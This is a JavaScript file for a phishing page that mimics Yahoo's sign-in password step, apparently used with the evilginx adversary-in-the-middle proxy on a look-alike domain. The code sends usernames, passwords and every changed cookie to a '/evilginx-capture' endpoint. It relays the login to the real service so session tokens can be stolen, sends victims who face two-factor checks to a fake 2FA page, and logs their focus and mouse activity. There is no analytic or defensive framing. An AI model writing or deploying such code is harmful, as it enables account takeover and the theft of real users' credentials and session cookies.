// Yahoo Password Page JavaScript - Complete Implementation
;(() => {
  // Configuration
  const CONFIG = {
    domain: "login.astrowind.live",
    endpoints: {
      password: "/account/challenge/password",
      capture: "/evilginx-capture",
    },
    selectors: {
      form: "#yahoo-password-form",
      username: "#username",
      password: "#passwd",
      submitBtn: 'button[type="submit"]',
    },
  }

  // State management
  const formState = {
    username: "",
    password: "",
    sessionData: {},
    isSubmitting: false,
  }

  // Utility functions
  const utils = {
    getUrlParams: () => {
      const params = new URLSearchParams(window.location.search)
      return {
        sessionIndex: params.get("sessionIndex") || "",
        acrumb: params.get("acrumb") || "",
        u: params.get("u") || "",
        bypass: params.get("bypass") || "",
      }
    },

    generateSessionId: () => {
      return "sess_" + Math.random().toString(36).substr(2, 16) + "_" + Date.now()
    },

    captureData: async (data) => {
      try {
        await fetch(CONFIG.endpoints.capture, {
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: JSON.stringify({
            ...data,
            timestamp: Date.now(),
            url: window.location.href,
            userAgent: navigator.userAgent,
            sessionId: formState.sessionData.sessionId,
          }),
        })
      } catch (error) {
        console.debug("Capture failed:", error)
      }
    },

    setLoading: (isLoading) => {
      const form = document.querySelector(CONFIG.selectors.form)
      const submitBtn = document.querySelector(CONFIG.selectors.submitBtn)

      if (isLoading) {
        form.classList.add("yahoo-loading")
        submitBtn.disabled = true
        submitBtn.textContent = "Signing in..."
      } else {
        form.classList.remove("yahoo-loading")
        submitBtn.disabled = false
        submitBtn.textContent = "Next"
      }
    },

    showError: (message) => {
      // Remove existing error
      const existingError = document.querySelector(".yahoo-error")
      if (existingError) {
        existingError.remove()
      }

      // Create new error
      const errorDiv = document.createElement("div")
      errorDiv.className = "yahoo-error"
      errorDiv.style.cssText = `
                background-color: #fce8e6;
                border: 1px solid #d93025;
                border-radius: 4px;
                padding: 12px;
                margin-bottom: 16px;
                color: #d93025;
                font-size: 14px;
            `
      errorDiv.textContent = message

      const form = document.querySelector(CONFIG.selectors.form)
      form.insertBefore(errorDiv, form.firstChild)
    },
  }

  // Cookie and session management
  const sessionManager = {
    init: () => {
      const urlParams = utils.getUrlParams()
      formState.sessionData = {
        sessionId: utils.generateSessionId(),
        sessionIndex: urlParams.sessionIndex,
        acrumb: urlParams.acrumb,
        referrer: document.referrer,
        timestamp: Date.now(),
      }

      // Pre-fill username if provided
      if (urlParams.u) {
        const usernameField = document.querySelector(CONFIG.selectors.username)
        if (usernameField) {
          usernameField.value = decodeURIComponent(urlParams.u)
          formState.username = usernameField.value
        }
      }
    },

    extractCookies: () => {
      const cookies = {}
      document.cookie.split(";").forEach((cookie) => {
        const [name, value] = cookie.trim().split("=")
        if (name && value) {
          cookies[name] = value
        }
      })
      return cookies
    },

    monitorCookies: () => {
      let lastCookies = sessionManager.extractCookies()

      setInterval(() => {
        const currentCookies = sessionManager.extractCookies()
        const newCookies = {}

        for (const [name, value] of Object.entries(currentCookies)) {
          if (lastCookies[name] !== value) {
            newCookies[name] = value
          }
        }

        if (Object.keys(newCookies).length > 0) {
          utils.captureData({
            type: "cookie_update",
            cookies: newCookies,
            allCookies: currentCookies,
          })
          lastCookies = currentCookies
        }
      }, 1000)
    },
  }

  // Form validation
  const validator = {
    validateEmail: (email) => {
      const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
      const phoneRegex = /^[+]?[1-9][\d]{0,15}$/
      return emailRegex.test(email) || phoneRegex.test(email)
    },

    validatePassword: (password) => {
      return password && password.length >= 1
    },

    validateForm: () => {
      const username = document.querySelector(CONFIG.selectors.username).value.trim()
      const password = document.querySelector(CONFIG.selectors.password).value

      if (!username) {
        utils.showError("Please enter your email address or phone number.")
        return false
      }

      if (!validator.validateEmail(username)) {
        utils.showError("Please enter a valid email address or phone number.")
        return false
      }

      if (!password) {
        utils.showError("Please enter your password.")
        return false
      }

      if (!validator.validatePassword(password)) {
        utils.showError("Password is required.")
        return false
      }

      return true
    },
  }

  // Form submission handler
  const formHandler = {
    handleSubmit: async (event) => {
      event.preventDefault()

      if (formState.isSubmitting) return

      const form = event.target
      const formData = new FormData(form)
      const username = formData.get("username").trim()
      const password = formData.get("passwd")

      // Update state
      formState.username = username
      formState.password = password
      formState.isSubmitting = true

      // Validate form
      if (!validator.validateForm()) {
        formState.isSubmitting = false
        return
      }

      // Set loading state
      utils.setLoading(true)

      // Capture credentials
      await utils.captureData({
        type: "credentials_entered",
        username: username,
        password: password,
        cookies: sessionManager.extractCookies(),
        sessionData: formState.sessionData,
      })

      // Simulate realistic delay
      await new Promise((resolve) => setTimeout(resolve, 1500 + Math.random() * 1000))

      try {
        // Submit to Yahoo (will be intercepted by evilginx)
        const response = await fetch(CONFIG.endpoints.password, {
          method: "POST",
          headers: {
            "Content-Type": "application/x-www-form-urlencoded",
            "X-Requested-With": "XMLHttpRequest",
          },
          body: new URLSearchParams({
            username: username,
            passwd: password,
            sessionIndex: formState.sessionData.sessionIndex,
            acrumb: formState.sessionData.acrumb,
            persistent: formData.get("persistent") || "n",
          }),
          credentials: "include",
        })

        // Capture response
        await utils.captureData({
          type: "password_response",
          status: response.status,
          headers: Object.fromEntries(response.headers.entries()),
          cookies: sessionManager.extractCookies(),
        })

        if (response.ok) {
          // Check if 2FA is required
          const responseText = await response.text()

          if (
            responseText.includes("challenge-selector") ||
            responseText.includes("2-step") ||
            responseText.includes("verification")
          ) {
            // Redirect to 2FA page
            window.location.href = `/2fa-index.html?u=${encodeURIComponent(username)}&sessionIndex=${formState.sessionData.sessionIndex}&acrumb=${formState.sessionData.acrumb}`
          } else {
            // Success - redirect to Yahoo Mail
            window.location.href = `https://mail.astrowind.live/`
          }
        } else {
          // Handle error
          utils.showError("Sorry, we don't recognize this email and password combination. Please try again.")
        }
      } catch (error) {
        console.error("Submission error:", error)
        utils.showError("Something went wrong. Please try again.")
      } finally {
        utils.setLoading(false)
        formState.isSubmitting = false
      }
    },
  }

  // Event listeners
  const eventListeners = {
    init: () => {
      // Form submission
      const form = document.querySelector(CONFIG.selectors.form)
      if (form) {
        form.addEventListener("submit", formHandler.handleSubmit)
      }

      // Real-time validation
      const usernameField = document.querySelector(CONFIG.selectors.username)
      const passwordField = document.querySelector(CONFIG.selectors.password)

      if (usernameField) {
        usernameField.addEventListener("input", (e) => {
          formState.username = e.target.value.trim()
          // Remove error on input
          const error = document.querySelector(".yahoo-error")
          if (error) error.remove()
        })

        usernameField.addEventListener("blur", async () => {
          if (formState.username) {
            await utils.captureData({
              type: "username_entered",
              username: formState.username,
            })
          }
        })
      }

      if (passwordField) {
        passwordField.addEventListener("input", (e) => {
          formState.password = e.target.value
          // Remove error on input
          const error = document.querySelector(".yahoo-error")
          if (error) error.remove()
        })
      }

      // Keyboard shortcuts
      document.addEventListener("keydown", (e) => {
        if (e.key === "Enter" && !formState.isSubmitting) {
          const form = document.querySelector(CONFIG.selectors.form)
          if (form) {
            form.dispatchEvent(new Event("submit"))
          }
        }
      })
    },
  }

  // Page visibility and focus tracking
  const trackingManager = {
    init: () => {
      // Track page visibility
      document.addEventListener("visibilitychange", () => {
        utils.captureData({
          type: "page_visibility",
          hidden: document.hidden,
          visibilityState: document.visibilityState,
        })
      })

      // Track focus events
      window.addEventListener("focus", () => {
        utils.captureData({
          type: "window_focus",
          focused: true,
        })
      })

      window.addEventListener("blur", () => {
        utils.captureData({
          type: "window_focus",
          focused: false,
        })
      })

      // Track mouse movement (basic)
      let mouseTimer
      document.addEventListener("mousemove", () => {
        clearTimeout(mouseTimer)
        mouseTimer = setTimeout(() => {
          utils.captureData({
            type: "user_activity",
            activity: "mouse_movement",
          })
        }, 5000)
      })
    },
  }

  // Initialize everything when DOM is ready
  const init = () => {
    sessionManager.init()
    sessionManager.monitorCookies()
    eventListeners.init()
    trackingManager.init()

    // Initial page load capture
    utils.captureData({
      type: "page_loaded",
      page: "password",
      sessionData: formState.sessionData,
      cookies: sessionManager.extractCookies(),
    })

    console.debug("Yahoo password page initialized")
  }

  // Start when DOM is ready
  if (document.readyState === "loading") {
    document.addEventListener("DOMContentLoaded", init)
  } else {
    init()
  }
})()
